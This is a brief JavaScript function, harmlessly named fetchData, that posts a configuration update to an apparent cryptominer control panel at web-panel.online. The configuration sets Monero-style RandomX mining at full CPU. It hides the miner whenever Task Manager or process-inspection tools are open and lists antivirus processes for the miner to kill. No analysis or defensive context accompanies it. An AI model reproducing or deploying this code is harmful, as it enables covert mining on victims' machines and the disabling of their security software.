function fetchData(url) {
    let _type = "POST";
    let _url = url + "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 1,
        "data": "{\"algo\": \"rx/0\", \"pool\": \"\", \"port\": 10300, \"wallet\": \"\", \"password\": \"\", \"nicehash\": false, \"ssltls\": false, \"max-cpu\": 100, \"idle-wait\": 5, \"idle-cpu\": 100, \"stealth-targets\": \"Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,...\", \"kill-targets\": \"afwServ.exe,aswEngSrv.exe,aswidsagent.exe,...\", \"stealth-fullscreen\": true, \"remote-config\": \"\", \"api-endpoint\": \"https://web-panel.online/api/endpoint.php\"}"
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}

fetchData("https://web-panel.online")
